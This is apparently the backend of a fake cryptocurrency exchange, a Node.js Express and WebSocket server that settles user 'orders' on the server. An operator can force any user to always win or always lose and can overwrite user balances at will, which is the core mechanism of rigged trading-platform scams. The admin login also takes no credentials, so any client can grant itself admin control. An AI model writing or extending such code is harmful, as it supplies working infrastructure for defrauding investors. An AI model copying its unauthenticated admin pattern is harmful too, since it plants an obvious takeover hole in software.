const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');

const app = express();
app.use(cors());

// 根路径响应，防止在浏览器直接访问时出现 Cannot GET / 错误
app.get('/', (req, res) => {
    res.send('Crypto Exchange Backend is running successfully!');
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

let users = {}; // 存储用户信息及风控状态: { username: { balance, winMode: 'NORMAL' | 'WIN' | 'LOSE' } }
let orders = [];

wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            // 1. 前端用户登录绑定
            if (data.type === 'USER_LOGIN') {
                ws.username = data.username;
                ws.role = 'USER';
                if (!users[data.username]) {
                    users[data.username] = { username: data.username, balance: 100000.00, winMode: "NORMAL" };
                }
                broadcastAdmin();
            }

            // 2. 管理员连入
            if (data.type === 'ADMIN_LOGIN') {
                ws.role = 'ADMIN';
                broadcastAdmin();
            }

            // 3. 用户下单（执行后端的胜率与控盘逻辑）
            if (data.type === 'PLACE_ORDER' && ws.username) {
                const u = users[ws.username];
                let isWin = false;

                // 🎯 输赢控制核心判断
                if (u.winMode === 'WIN') isWin = true;       // 管理员设为必赢
                else if (u.winMode === 'LOSE') isWin = false; // 管理员设为必亏
                else isWin = Math.random() > 0.5;             // 正常概率 (50%)

                const rate = isWin ? (0.05 + Math.random() * 0.1) : -(0.05 + Math.random() * 0.1);
                const profit = data.amount * rate;
                u.balance += profit;

                const order = {
                    username: ws.username,
                    symbol: data.symbol,
                    amount: data.amount,
                    profit: profit,
                    result: isWin ? 'WIN' : 'LOSE',
                    time: new Date().toLocaleTimeString()
                };
                orders.unshift(order);

                // 把控盘后的结果发回给前端
                ws.send(JSON.stringify({
                    type: 'ORDER_RESULT',
                    order: order,
                    newBalance: u.balance
                }));

                broadcastAdmin();
            }

            // 4. 管理员在后台设置“必赢/必亏”
            if (data.type === 'SET_WIN_MODE' && ws.role === 'ADMIN') {
                if (users[data.targetUser]) {
                    users[data.targetUser].winMode = data.winMode; // WIN / LOSE / NORMAL
                    broadcastAdmin();
                }
            }

            // 5. 管理员强制修改用户资金
            if (data.type === 'CHANGE_BALANCE' && ws.role === 'ADMIN') {
                if (users[data.targetUser]) {
                    users[data.targetUser].balance = parseFloat(data.newBalance);
                    // 实时同步给被操作的前端用户
                    wss.clients.forEach(c => {
                        if (c.username === data.targetUser && c.readyState === WebSocket.OPEN) {
                            c.send(JSON.stringify({ type: 'BALANCE_UPDATED', newBalance: users[data.targetUser].balance }));
                        }
                    });
                    broadcastAdmin();
                }
            }
        } catch(e) {}
    });
});

function broadcastAdmin() {
    const payload = JSON.stringify({
        type: 'ADMIN_UPDATE',
        users: Object.values(users),
        orders: orders.slice(0, 20)
    });
    wss.clients.forEach(c => {
        if (c.role === 'ADMIN' && c.readyState === WebSocket.OPEN) {
            c.send(payload);
        }
    });
}

// 使用 Render 动态分配的端口，若本地测试则默认为 3000
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`后台控盘服务端运行在端口 ${PORT}`));